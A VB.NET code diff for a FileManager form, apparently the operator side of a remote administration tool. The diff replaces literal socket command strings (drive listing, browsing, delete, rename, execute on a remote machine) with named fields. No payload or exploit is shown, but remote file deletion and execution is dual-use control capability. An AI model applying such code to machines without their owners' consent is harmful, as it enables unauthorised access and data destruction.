@@ -10,7 +10,7 @@ Public Class FileManager
     End Sub
     Private Sub FileManager_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
         clearwait()
-        Main.S.Send(sock, "GetDrives" & Main.Sep) ''Get hard drives
+        Main.S.Send(sock, Main.n.getdrives & Main.Sep) ''Get hard drives
     End Sub
 
 
@@ -20,11 +20,9 @@ Public Class FileManager
                 If DirTextBox.Text.Length = 0 Then
                     DirTextBox.Text += FileListView.FocusedItem.Text
                     assumeddir += FileListView.FocusedItem.Text
-                    ' Form1.S.Send(sock, "FileManager" & Main.Sep & TextBox1.Text)
                 Else
                     DirTextBox.Text += FileListView.FocusedItem.Text & "\"
                     assumeddir += FileListView.FocusedItem.Text & "\"
-                    ' Form1.S.Send(sock, "FileManager" & Main.Sep & TextBox1.Text)
                 End If
                 RefreshList()
             End If
@@ -33,13 +31,13 @@ Public Class FileManager
     Public Sub RefreshList()
         Try
             clearwait()
-            Main.S.Send(sock, "FileManager" & Main.Sep & assumeddir)
+            Main.S.Send(sock, Main.n.getfileman & Main.Sep & assumeddir)
         Catch ex As Exception
             donewait()
             Try
                 UpButton.PerformClick()
             Catch ex2 As Exception
-                Main.S.Send(sock, "GetDrives" & Main.Sep)
+                Main.S.Send(sock, Main.n.getdrives & Main.Sep)
             End Try
             'Try
             '    DirTextBox.Text = assumeddir
@@ -57,9 +55,9 @@ Public Class FileManager
         Select Case FileListView.FocusedItem.ImageIndex
             Case 0 To 1
             Case 2
-                Main.S.Send(sock, "Delete" & Main.Sep & "Folder" & Main.Sep & assumeddir & FileListView.FocusedItem.Text)
+                Main.S.Send(sock, Main.n.delete & Main.Sep & Main.n.folder & Main.Sep & assumeddir & FileListView.FocusedItem.Text)
             Case Else
-                Main.S.Send(sock, "Delete" & Main.Sep & "File" & Main.Sep & assumeddir & FileListView.FocusedItem.Text)
+                Main.S.Send(sock, Main.n.delete & Main.Sep & Main.n.file & Main.Sep & assumeddir & FileListView.FocusedItem.Text)
         End Select
         RefreshList()
     End Sub
@@ -69,7 +67,7 @@ Public Class FileManager
     End Sub
 
     Private Sub ExecuteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ExecuteToolStripMenuItem.Click
-        Main.S.Send(sock, "Execute" & Main.Sep & assumeddir & FileListView.FocusedItem.Text)
+        Main.S.Send(sock, Main.n.execute & Main.Sep & assumeddir & FileListView.FocusedItem.Text)
     End Sub
 
     Private Sub RenameToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RenameToolStripMenuItem.Click
@@ -79,10 +77,10 @@ Public Class FileManager
             Select Case FileListView.FocusedItem.ImageIndex
                 Case 0 To 1
                 Case 2
-                    Main.S.Send(sock, "Rename" & Main.Sep & "Folder" & Main.Sep & assumeddir & FileListView.FocusedItem.Text & Main.Sep & a)
+                    Main.S.Send(sock, Main.n.rename & Main.Sep & Main.n.folder & Main.Sep & assumeddir & FileListView.FocusedItem.Text & Main.Sep & a)
                     RefreshList()
                 Case Else
-                    Main.S.Send(sock, "Rename" & Main.Sep & "File" & Main.Sep & assumeddir & FileListView.FocusedItem.Text & Main.Sep & a)
+                    Main.S.Send(sock, Main.n.rename & Main.Sep & Main.n.file & Main.Sep & assumeddir & FileListView.FocusedItem.Text & Main.Sep & a)
                     RefreshList()
             End Select
         End If
@@ -93,7 +91,7 @@ Public Class FileManager
             If assumeddir.Length < 4 Then ''dir like C:\
                 DirTextBox.Text = ""
                 assumeddir = ""
-                Main.S.Send(sock, "GetDrives" & Main.Sep)
+                Main.S.Send(sock, Main.n.getdrives & Main.Sep)
             Else
                 DirTextBox.Text = assumeddir
                 DirTextBox.Text = DirTextBox.Text.Substring(0, DirTextBox.Text.LastIndexOf("\"))
@@ -109,7 +107,7 @@ Public Class FileManager
             clearwait()
             If assumeddir.Length < 2 Then ''dir like C:\
                 assumeddir = ""
-                Main.S.Send(sock, "GetDrives" & Main.Sep)
+                Main.S.Send(sock, Main.n.getdrives & Main.Sep)
             Else
                 RefreshList()
             End If
@@ -120,7 +118,7 @@ Public Class FileManager
         DirTextBox.Text = ""
         assumeddir = ""
         clearwait()
-        Main.S.Send(sock, "GetDrives" & Main.Sep) ''Get hard drives (same as load)
+        Main.S.Send(sock, Main.n.getdrives & Main.Sep) ''Get hard drives (same as load)
     End Sub
 
     Private Sub GoButton_Click(sender As Object, e As EventArgs) Handles GoButton.Click
@@ -128,7 +126,7 @@ Public Class FileManager
             If DirTextBox.Text.Length > 2 Then ''dir like C:\
                 assumeddir = DirTextBox.Text
                 clearwait()
-                Main.S.Send(sock, "FileManager" & Main.Sep & DirTextBox.Text)
+                Main.S.Send(sock, Main.n.getfileman & Main.Sep & DirTextBox.Text)
             End If
         End If
     End Sub
